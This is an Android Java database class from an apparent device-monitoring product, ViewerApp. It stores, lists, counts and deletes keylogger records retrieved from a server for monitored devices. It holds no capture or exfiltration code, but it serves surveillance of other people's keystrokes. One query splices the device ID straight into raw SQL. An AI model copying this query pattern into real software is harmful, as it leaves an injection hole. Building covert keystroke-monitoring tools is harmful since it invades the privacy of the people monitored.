/*
  ClassName: DatabaseKeylogger.java
  @Project: ViewerApp
  @author  Lucas Walker (lucas.walker@jexpa.com)
  Created Date: 2018-06-05
  Description: Class DatabaseClipboard is used to create, add, modify, delete databases, save
  the Keylogger Log values from the server, use the "KeyloggerHistory.class".
  History:2021-07-23
  Copyright © 2018 Jexpa LLC. All rights reserved.
 */

package com.scp.viewer.Database;

import android.annotation.SuppressLint;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.util.Log;
import com.scp.viewer.API.APIDatabase;
import com.scp.viewer.API.Global;
import com.scp.viewer.Model.Keyloggers;
import java.util.ArrayList;
import java.util.List;
import static com.scp.viewer.API.Global.NumberLoad;
import static com.scp.viewer.Database.DatabaseContact.checkItemExist;
import static com.scp.viewer.Database.DatabaseHelper.getInstance;
import static com.scp.viewer.Database.Entity.CalendarEntity.COLUMN_DEVICE_ID;
import static com.scp.viewer.Database.Entity.CalendarEntity.COLUMN_ID;
import static com.scp.viewer.Database.Entity.CalendarEntity.COLUMN_ROW_INDEX;
import static com.scp.viewer.Database.Entity.KeyloggerEntity.COLUMN_CLIENT_KEYLOGGER_TIME;
import static com.scp.viewer.Database.Entity.KeyloggerEntity.COLUMN_CONTENT_KEYLOGGER;
import static com.scp.viewer.Database.Entity.KeyloggerEntity.COLUMN_CREATED_DATE_KEYLOGGER;
import static com.scp.viewer.Database.Entity.KeyloggerEntity.COLUMN_KEYLOGGER_NAME;
import static com.scp.viewer.Database.Entity.KeyloggerEntity.TABLE_KEYLOGGER_HISTORY;

public class DatabaseKeylogger
{
    private Context context;
    private DatabaseHelper database;
    public DatabaseKeylogger(Context context)
    {
        this.context = context;
        this.database = getInstance(context);
        if(!database.checkTableExist(TABLE_KEYLOGGER_HISTORY))
            createTable();
    }

    private void createTable() {

        Log.i(Global.TAG, "DatabaseKeylogger.onCreate ... " + TABLE_KEYLOGGER_HISTORY);
        String scriptTable = " CREATE TABLE " + TABLE_KEYLOGGER_HISTORY + "(" + COLUMN_ROW_INDEX + " LONG ,"
                + COLUMN_ID + " LONG,"
                + COLUMN_DEVICE_ID + " TEXT,"
                + COLUMN_KEYLOGGER_NAME + " TEXT,"
                + COLUMN_CLIENT_KEYLOGGER_TIME + " TEXT,"
                + COLUMN_CONTENT_KEYLOGGER + " TEXT,"
                + COLUMN_CREATED_DATE_KEYLOGGER + " TEXT" + ")";
        database.getWritableDatabase().execSQL(scriptTable);
    }

    /**
        addKeylogger is method add a Keylogger to server from databases of SQLite
     */
    public void addKeylogger(List<Keyloggers> keyloggersList) {

        database.getWritableDatabase().beginTransaction();

        try {
            for (int i = 0; i < keyloggersList.size(); i++) {
                if(!checkItemExist(database.getWritableDatabase(), TABLE_KEYLOGGER_HISTORY,
                        COLUMN_DEVICE_ID, keyloggersList.get(i).getDevice_ID(),
                        COLUMN_ID, keyloggersList.get(i).getID()))
                {
                    //  contentValues1 receives the value from the method API_Add_Database()
                    ContentValues contentValues1 = APIDatabase.API_Add_Database(keyloggersList.get(i),false);
                    // Insert a row of data into the table.
                    database.getWritableDatabase().insert(TABLE_KEYLOGGER_HISTORY, null, contentValues1);
                }
            }
            database.getWritableDatabase().setTransactionSuccessful();

        } finally {
            database.getWritableDatabase().endTransaction();
        }
        //  Close the database connection.
        database.close();
    }


    /**
     * getAll_Keylogger_ID_History Get a list of all kelogger items from the DeviceID and the number of offSets to get.
     * @param deviceID deviceID
     * @param offSet the number of offSets to get.
     * @return List<Keylogger>
     */
    public List<Keyloggers> getAll_Keylogger_ID_History(String deviceID, int offSet) {
        Log.i(Global.TAG, "DatabaseKeylogger.getAll_Keylogger_ID_History ... " + TABLE_KEYLOGGER_HISTORY);
        List<Keyloggers> keyloggersArrayList = new ArrayList<>();
        // Select All Query
        String selectQuery = "SELECT  * FROM " + TABLE_KEYLOGGER_HISTORY + " WHERE Device_ID = '"+ deviceID
                + "' ORDER BY " + COLUMN_CLIENT_KEYLOGGER_TIME + " DESC LIMIT "+ NumberLoad +" OFFSET "+ offSet;

        @SuppressLint("Recycle") Cursor cursor = database.getWritableDatabase().rawQuery(selectQuery, null);

        // Browse on the cursor, and add it to the list.
        if (cursor.moveToFirst()) {
            do {
                    Keyloggers keyloggers = new Keyloggers();
                    keyloggers.setRowIndex(cursor.getInt(cursor.getColumnIndex(COLUMN_ROW_INDEX)));
                    keyloggers.setID(cursor.getInt(cursor.getColumnIndex(COLUMN_ID)));
                    keyloggers.setDevice_ID(cursor.getString(cursor.getColumnIndex(COLUMN_DEVICE_ID)));
                    keyloggers.setKeyLogger_Name(cursor.getString(cursor.getColumnIndex(COLUMN_KEYLOGGER_NAME)));
                    keyloggers.setClient_KeyLogger_Time(cursor.getString(cursor.getColumnIndex(COLUMN_CLIENT_KEYLOGGER_TIME)));
                    keyloggers.setContent(cursor.getString(cursor.getColumnIndex(COLUMN_CONTENT_KEYLOGGER)));
                    keyloggers.setCreated_Date(cursor.getString(cursor.getColumnIndex(COLUMN_CREATED_DATE_KEYLOGGER)));

                keyloggersArrayList.add(keyloggers);

            } while (cursor.moveToNext());
        }
        // return note list
        return keyloggersArrayList;
    }

    public int get_Keylogger_Count_DeviceID(String deviceID) {
        Log.i(Global.TAG, "DatabaseKeylogger.get_Keylogger_Count_DeviceID ... " + TABLE_KEYLOGGER_HISTORY);

        //Cursor cursor = database.rawQuery(countQuery, null);
        Cursor cursor = database.getWritableDatabase().query(TABLE_KEYLOGGER_HISTORY, new String[]{COLUMN_DEVICE_ID
                }, COLUMN_DEVICE_ID + "=?",
                new String[]{String.valueOf(deviceID)}, null, null, null, null);
        int count = cursor.getCount();
        cursor.close();
        // return count
        return count;
    }

    /**
     * delete_Keylogger_History: Delete keylogger items by ID
     * @param keyloggers keylogger object
     */
    public void delete_Keylogger_History(Keyloggers keyloggers) {
        Log.i(Global.TAG, "DatabaseKeylogger.delete_Keylogger_History... " + keyloggers.getID());

        database.getWritableDatabase().delete(TABLE_KEYLOGGER_HISTORY, COLUMN_ID + " = ?",
                new String[]{String.valueOf(keyloggers.getID())});
        database.close();
    }

}
